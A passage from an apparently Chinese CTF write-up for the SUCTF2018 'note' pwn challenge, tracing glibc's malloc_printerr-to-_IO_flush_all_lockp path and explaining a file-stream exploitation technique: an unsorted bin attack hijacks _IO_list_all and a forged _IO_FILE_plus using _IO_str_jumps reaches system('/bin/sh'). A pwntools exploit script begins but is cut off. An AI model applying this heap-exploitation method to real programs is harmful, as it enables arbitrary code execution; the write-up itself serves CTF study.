class="number">0</span>);</span><br><span class="line">      <span class="keyword">while</span> (cp &gt; buf)</span><br><span class="line">        *--cp = <span class="string">'0'</span>;</span><br><span class="line"></span><br><span class="line">      __libc_message (action &amp; <span class="number">2</span>, <span class="string">"*** Error in `%s': %s: 0x%s ***\n"</span>,</span><br><span class="line">                      __libc_argv[<span class="number">0</span>] ? : <span class="string">"&lt;unknown&gt;"</span>, str, cp);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (action &amp; <span class="number">2</span>)</span><br><span class="line">    <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​</p>
<p>在<code>__libc_message</code>中会调用<code>absort（）</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Abort with an error message.  */</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">__libc_message (<span class="keyword">int</span> do_abort, <span class="keyword">const</span> <span class="keyword">char</span> *fmt, ...)</span><br><span class="line">&#123;</span><br><span class="line">  va_list ap;</span><br><span class="line">  <span class="keyword">int</span> fd = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  va_start (ap, fmt);</span><br><span class="line"></span><br><span class="line">   ……</span><br><span class="line"></span><br><span class="line">  va_end (ap);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (do_abort)</span><br><span class="line">    &#123;</span><br><span class="line">      BEFORE_ABORT (do_abort, written, fd);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Kill the application.  */</span></span><br><span class="line">      <span class="built_in">abort</span> ();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>abort()</code>中调用<code>_IO_flush_all_lockp()</code>，在调用之前先define为fflush：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fflush(s) _IO_flush_all_lockp (0)</span></span><br><span class="line"></span><br><span class="line"> ……</span><br><span class="line"><span class="keyword">void</span></span><br><span class="line"><span class="built_in">abort</span> (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">act</span>;</span></span><br><span class="line">  <span class="keyword">sigset_t</span> sigs;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First acquire the lock.  */</span></span><br><span class="line">  __libc_lock_lock_recursive (lock);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Now it's for sure we are alone.  But recursive calls are possible.  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Unlock SIGABRT.  */</span></span><br><span class="line">  <span class="keyword">if</span> (stage == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ++stage;</span><br><span class="line">      <span class="keyword">if</span> (__sigemptyset (&amp;sigs) == <span class="number">0</span> &amp;&amp;</span><br><span class="line">	  __sigaddset (&amp;sigs, SIGABRT) == <span class="number">0</span>)</span><br><span class="line">	__sigprocmask (SIG_UNBLOCK, &amp;sigs, (<span class="keyword">sigset_t</span> *) <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flush all streams.  We cannot close them now because the user</span></span><br><span class="line"><span class="comment">     might have registered a handler for SIGABRT.  */</span></span><br><span class="line">  <span class="keyword">if</span> (stage == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ++stage;</span><br><span class="line">      <span class="comment">//_IO_flush_all_lockp()</span></span><br><span class="line">      fflush (<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  ……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><em>离底层越来越近了……</em></p>
<p><code>_IO_flush_all_lockp()</code>获取了_IO_list_all链表，对每一个结点进行处理：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="keyword">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line">  <span class="keyword">int</span> last_stamp;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  __libc_cleanup_region_start (do_lock, flush_cleanup, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">if</span> (do_lock)</span><br><span class="line">    _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  last_stamp = _IO_list_all_stamp;</span><br><span class="line">  <span class="comment">//获取_IO_list_all</span></span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">	_IO_flockfile (fp);</span><br><span class="line">		</span><br><span class="line">      <span class="comment">//先对_IO_FILE中的mode,_IO_write,_IO_write_base等检查，满足条件才执行_IO_OVERFLOW</span></span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br><span class="line">	   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">	       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">#endif</span><br><span class="line">	   )</span><br><span class="line">	  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">	result = EOF;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">	_IO_funlockfile (fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (last_stamp != _IO_list_all_stamp)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="comment">/* Something was added to the list.  Start all over again.  */</span></span><br><span class="line">	  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">	  last_stamp = _IO_list_all_stamp;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">     <span class="comment">//循环是通过每个结点的chain字段</span></span><br><span class="line">	fp = fp-&gt;_chain;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">if</span> (do_lock)</span><br><span class="line">    _IO_lock_unlock (list_all_lock);</span><br><span class="line">  __libc_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中，确定<code>_IO_list_all</code>中结点的结构体为<code>_IO_FILE_plus</code>:</p>
<p><img src="/2018/06/05/suctf2018-note/iolistall.png" alt="_IO_list_all链表的结点类型"></p>
<p><code>_IO_FILE_plus</code>的结构，即一个<code>_IO_FILE</code>结构和一个虚表指针<code>vtable</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>_IO_FILE结构如下，其中chain是用于记录下一结点的位置的：</p>
<p><img src="/2018/06/05/suctf2018-note/iofile.png" alt="_IO_FILE结构体"></p>
<p>继续看<code>_IO_flush_all_lockp</code>，在if处对结点中各字段进行检查，当满足条件时，会执行<code>_IO_OVERFLOW</code>，函数的寻址是通过查寻vtable实现的。vtable的结构如下，第四行即为<code>_IO_OVERFLOW</code>的地址：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">289	&#123;</span></span><br><span class="line"><span class="number">290</span>	    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy);</span><br><span class="line"><span class="number">291</span>	    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy2);</span><br><span class="line"><span class="number">292</span>	    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line"><span class="number">293</span>	    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line"><span class="number">294</span>	    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line"><span class="number">295</span>	    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line"><span class="number">296</span>	    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line"><span class="number">297</span>	    <span class="comment">/* showmany */</span></span><br><span class="line"><span class="number">298</span>	    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line"><span class="number">299</span>	    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line"><span class="number">300</span>	    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line"><span class="number">301</span>	    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line"><span class="number">302</span>	    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line"><span class="number">303</span>	    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line"><span class="number">304</span>	    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line"><span class="number">305</span>	    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line"><span class="number">306</span>	    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line"><span class="number">307</span>	    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line"><span class="number">308</span>	    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line"><span class="number">309</span>	    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line"><span class="number">310</span>	    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line"><span class="number">311</span>	    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="number">312</span>	&#125;;</span><br></pre></td></tr></table></figure>
<p>按照<a href="http://simp1e.leanote.com/post/Hctf-2017-babyprintf" target="_blank" rel="noopener">simp1e</a>大佬的说法，2.24版本的glibc在执行<code>_IO_OVERFLOW</code>之前还有一个对vtable的检查函数：<code>_IO_check_vtable</code>，他的思路是利用已有的vtable而不是我们自己伪造的vtable，这样很容易过check。实际上也确实有这样的vtable结构：<code>_IO_str_jumps</code>，它就是vtable类型的结构体，因此<code>_IO_OVERFLOW</code>的位置对应于<code>_IO_str_overflow</code>（第三行）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line"><span class="class">356	&#123;</span></span><br><span class="line"><span class="number">357</span>	  JUMP_INIT_DUMMY,</span><br><span class="line"><span class="number">358</span>	  JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line"><span class="number">359</span>	  JUMP_INIT(overflow, _IO_str_overflow),</span><br><span class="line"><span class="number">360</span>	  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line"><span class="number">361</span>	  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line"><span class="number">362</span>	  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line"><span class="number">363</span>	  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line"><span class="number">364</span>	  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line"><span class="number">365</span>	  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line"><span class="number">366</span>	  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line"><span class="number">367</span>	  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line"><span class="number">368</span>	  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line"><span class="number">369</span>	  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line"><span class="number">370</span>	  JUMP_INIT(read, _IO_default_read),</span><br><span class="line"><span class="number">371</span>	  JUMP_INIT(write, _IO_default_write),</span><br><span class="line"><span class="number">372</span>	  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line"><span class="number">373</span>	  JUMP_INIT(close, _IO_default_close),</span><br><span class="line"><span class="number">374</span>	  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line"><span class="number">375</span>	  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line"><span class="number">376</span>	  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line"><span class="number">377</span>	&#125;;</span><br></pre></td></tr></table></figure>
<p>如果我们能够控制_IO_str_overflow的地址，就能执行system函数了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">_IO_str_overflow (FILE *fp, <span class="keyword">int</span> c)</span><br><span class="line"><span class="number">82</span>	&#123;</span><br><span class="line"><span class="number">83</span>	  <span class="keyword">int</span> flush_only = c == EOF;</span><br><span class="line"><span class="number">84</span>	  <span class="keyword">size_t</span> pos;</span><br><span class="line"><span class="number">85</span>	  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line"><span class="number">86</span>	      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line"><span class="number">87</span>	  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line"><span class="number">88</span>	    &#123;</span><br><span class="line"><span class="number">89</span>	      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line"><span class="number">90</span>	      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line"><span class="number">91</span>	      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line"><span class="number">92</span>	    &#125;</span><br><span class="line"><span class="number">93</span>	  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line"><span class="number">94</span>	  <span class="keyword">if</span> (pos &gt;= (<span class="keyword">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line"><span class="number">95</span>	    &#123;</span><br><span class="line"><span class="number">96</span>	      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line"><span class="number">97</span>	        <span class="keyword">return</span> EOF;</span><br><span class="line"><span class="number">98</span>	      <span class="keyword">else</span></span><br><span class="line"><span class="number">99</span>	        &#123;</span><br><span class="line"><span class="number">100</span>	          <span class="keyword">char</span> *new_buf;</span><br><span class="line"><span class="number">101</span>	          <span class="keyword">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line"><span class="number">102</span>	          <span class="keyword">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line"><span class="number">103</span>	          <span class="keyword">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line"><span class="number">104</span>	          <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line"><span class="number">105</span>	            <span class="keyword">return</span> EOF;</span><br><span class="line">    		 <span class="comment">//这里有一个相对地址的调用，函数地址是fp的某地址，参数为new_size.</span></span><br><span class="line"><span class="number">106</span>	          new_buf</span><br><span class="line"><span class="number">107</span>	            = (<span class="keyword">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);</span><br><span class="line"><span class="number">108</span>	          <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line"><span class="number">109</span>	            &#123;</span><br><span class="line"><span class="number">110</span>	              <span class="comment">/*          __ferror(fp) = 1; */</span></span><br><span class="line"><span class="number">111</span>	              <span class="keyword">return</span> EOF;</span><br><span class="line"><span class="number">112</span>	            &#125;</span><br><span class="line"><span class="number">113</span>	          <span class="keyword">if</span> (old_buf)</span><br><span class="line"><span class="number">114</span>	            &#123;</span><br><span class="line"><span class="number">115</span>	              <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line"><span class="number">116</span>	              (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf);</span><br><span class="line"><span class="number">117</span>	              <span class="comment">/* Make sure _IO_setb won't try to delete _IO_buf_base. */</span></span><br><span class="line"><span class="number">118</span>	              fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"><span class="number">119</span>	            &#125;</span><br><span class="line"><span class="number">120</span>	          <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">'\0'</span>, new_size - old_blen);</span><br><span class="line"><span class="number">121</span>	</span><br><span class="line"><span class="number">122</span>	          _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line"><span class="number">123</span>	          fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line"><span class="number">124</span>	          fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line"><span class="number">125</span>	          fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line"><span class="number">126</span>	          fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"><span class="number">127</span>	</span><br><span class="line"><span class="number">128</span>	          fp-&gt;_IO_write_base = new_buf;</span><br><span class="line"><span class="number">129</span>	          fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line"><span class="number">130</span>	        &#125;</span><br><span class="line"><span class="number">131</span>	    &#125;</span><br><span class="line"><span class="number">132</span>	</span><br><span class="line"><span class="number">133</span>	  <span class="keyword">if</span> (!flush_only)</span><br><span class="line"><span class="number">134</span>	    *fp-&gt;_IO_write_ptr++ = (<span class="keyword">unsigned</span> <span class="keyword">char</span>) c;</span><br><span class="line"><span class="number">135</span>	  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line"><span class="number">136</span>	    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line"><span class="number">137</span>	  <span class="keyword">return</span> c;</span><br><span class="line"><span class="number">138</span>	&#125;</span><br></pre></td></tr></table></figure>
<p>通过IDA查看libc，找到<code>_IO_str_overflow</code>，可以看到，a1是<code>_IO_str_overflow</code>的第一个参数，即fp；要执行的函数偏移为<code>fp+224</code>，参数为<code>v7</code>。可以考虑把fp+224写为system的地址，v7写为/bin/sh的地址；v6就等于<code>(v7-100)/2</code>，而v6又是<code>*(fp+64)-v5</code>，<code>v5= *(fp+56)</code>，这样我们可以自己构造一个<code>_IO_FILE_plus</code>结构，然后在64和56偏移处放入v6和v5，并把vtable的地址设置为<code>_IO_str_jumps</code>结构体的地址，就能</p>
<p><img src="/2018/06/05/suctf2018-note/ida.png" alt="IDA查看参数"></p>
<p>总结一下，在malloc_printerr中函数的调用关系如下：</p>
<p><img src="/2018/06/05/suctf2018-note/stack.png" alt="函数调用栈"></p>
</li>
</ol>
<h2 id="举例分析–SUCTF2018-NOTE"><a href="#举例分析–SUCTF2018-NOTE" class="headerlink" title="举例分析–SUCTF2018 NOTE"></a>举例分析–SUCTF2018 NOTE</h2><h3 id="基本逻辑"><a href="#基本逻辑" class="headerlink" title="基本逻辑"></a>基本逻辑</h3><p>依旧是菜单类的小游戏，有三个功能：添加、展示和删除。</p>
<p>在游戏开始之前，先对ptr进行了初始化。ptr是位于bss段的一个指针数组，在ptr[0]中写入了：Hello,Welcome to SUCTF,I letf something here!</p>
<p>add函数找到ptr中第一个为空的位置，分配size大小的空间，并输入内容，此处<strong>没有对输入内容的大小做限制</strong>。</p>
<p><img src="/2018/06/05/suctf2018-note/add.png" alt="add"></p>
<p>show函数通过索引找到对应内存，输出内容。</p>
<p><img src="/2018/06/05/suctf2018-note/show.png" alt="show"></p>
<p>dele函数会释放ptr[0]和qword_202078中存放地址对应的内存。</p>
<p><img src="/2018/06/05/suctf2018-note/dele.png" alt="dele"></p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>在add中，对输入的内容长度未做限制，会造成堆溢出漏洞。利用堆溢出漏洞，可以构造出上述的<code>_IO_FILE_plus</code>结构。</p>
<p>首先，泄露system地址，还是常用的UAF，当dele释放之后，通过读取unsortedbin的FD指针，计算出libc的地址。</p>
<p>然后，为了能够执行构造的<code>_IO_FILE_plus</code>结构中vtable的<code>_IO_OVERFLOW</code>，要对<code>_IO_list_all</code>进行劫持，即在<code>_IO_flush_all_lockp</code>函数中对<code>_IO_list_all</code>的每一个结点进行遍历时，要让它检查我们伪造的结点。因此考虑用unsorted bin attack，使解链操作时，<code>*_IO_list_all = unsorted_chunk(av)</code>，即第一个结点位于unsorted bin的头部，这样，chain对应的位置恰好为第六个small bins头的位置。我们可以想办法把伪造的<code>_IO_FILE_plus</code>放在第六个small bins对应的大小里，即0x60。</p>
<p>采用的方法是，通过缓冲区溢出修改下一个位于unsorted bin 的chunk大小为0x61，在这个chunk里存放伪造的<code>_IO_FILE_plus</code>。此时再分配一个大于0x60大小的内存，由于unsorted bin中的块不能满足要求，则会先将这个块放入对应大小的small bins里，然后再查找下一块。查找下一块时由于unsorted bin attack已经破坏了chunk的FD，由此就会触发<code>malloc_printerr</code>函数，遍历<code>_IO_list_all</code>，第一个结点已经转移unsorted bin上，但不满足条件，于是通过chain字段找到下一个结点，也就是我们伪造的结点，最终能够执行<code>system</code>。</p>
<h3 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#SUCTF&#123;Me1z1jiu_say_s0rry_LOL&#125;</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">debug=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span 